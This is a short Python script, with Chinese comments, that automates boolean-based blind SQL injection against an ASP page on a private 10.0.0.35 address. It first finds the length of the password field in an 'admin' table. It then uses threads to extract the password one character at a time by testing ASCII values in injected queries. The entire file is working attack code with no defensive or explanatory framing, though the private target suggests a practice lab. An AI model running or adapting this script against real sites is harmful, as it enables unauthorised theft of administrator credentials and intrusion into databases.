import requests
import time
from threading import Thread, Lock


def ACESS_INJECTION_SQL():
    site = "http://10.0.0.35:81/Production/PRODUCT_DETAIL.asp?id=1513"
    table = "admin"
    field = "password"
    mutex = Lock()
    field_length = 0
    result_dict = {}
    result_list = []

    # 判断字段长度
    for i in range(1, 1000):
        s = f"{site} and (select top 1 len({field}) from {table})={i}"
        if requests.get(url=s).status_code == 200:
            field_length = i
            break

    # 猜解字段数据
    def Field_Guessing(a):
        for i in range(1, 129):
            r_site = f"{site} and (select top 1 asc(mid({field},{a},1)) from {table})={i}"
            status_code = requests.get(url=r_site).status_code
            if status_code == 200:
                mutex.acquire()
                result_dict[a] = chr(i)
                mutex.release()
                print("猜解成功 " + chr(i))
                break
            print("猜解错误 " + str(i))

    t_list = []
    for i in range(1, field_length + 1):
        t = Thread(target=Field_Guessing, args=(i,))
        t.start()
        t_list.append(t)

    for t in t_list:
        t.join()

    sorted_dict = {k: result_dict[k] for k in sorted(result_dict, key=lambda x: int(x))}
    # print(sorted_dict)
    for i in sorted_dict:
        result_list.append(sorted_dict[i])
    return ''.join(result_list)


if __name__ == '__main__':
    print("开始猜解数据...")
    start_time = time.time()
    result = ACESS_INJECTION_SQL()
    print("Result: " + result)
    stop_time = time.time()
    print("Time: " + str(stop_time - start_time))
